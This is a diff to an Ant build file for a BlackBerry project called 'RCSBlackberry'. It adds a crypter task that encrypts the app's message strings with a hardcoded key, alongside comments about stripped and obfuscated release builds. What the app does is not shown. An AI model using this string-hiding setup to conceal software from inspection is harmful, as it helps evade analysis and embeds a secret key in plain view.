@@ -24,7 +24,6 @@
 	<property name="lib.codename" value="net_rim_bb_lib_base" />
 	<property name="group.name" value="Rim Library" />
 
-
 	<!-- Symbols 
 	DEBUG: versione con i log di debug su file
 	RELEASE: versione strippata e offuscata
@@ -51,6 +50,17 @@
 	<taskdef name="wtkobfuscate" classname="de.pleumann.antenna.WtkObfuscate" classpath="${antenna.jar}" />
 	<taskdef name="wtkjad" classname="de.pleumann.antenna.WtkJad" classpath="${antenna.jar}" />
 
+	<taskdef name="crypter" classname="za.co.massdosage.ant.Crypter">
+		<classpath>
+			<pathelement path="crypter/build/archive/crypter-ant.jar" />
+		</classpath>
+	</taskdef>
+
+	<target name="encrypt-messages">
+		<delete file="RCSBlackberry/messages.bin" />
+		<crypter encrypt="true" keyFile="0x5333494a32158f52" inputFile="RCSBlackberry/preprocess/messages.properties.all" outputFile="RCSBlackberry/messages.bin" />
+	</target>
+
 	<target name="Display-Builtins" description="Display Builtin Properties">
 		<!-- the absolute path to the location of the buildfile -->
 		<echo>${basedir}</echo>
@@ -63,7 +73,6 @@
 		<!-- ant.java.version - the JVM version Ant detected; currently it can hold the values "1.1", "1.2", "1.3", "1.4" and "1.5". -->
 		<echo>${ant.java.version}</echo>
 	</target>
-
 
 	<macrodef name="preprocess">
 		<attribute name="dir.src" />
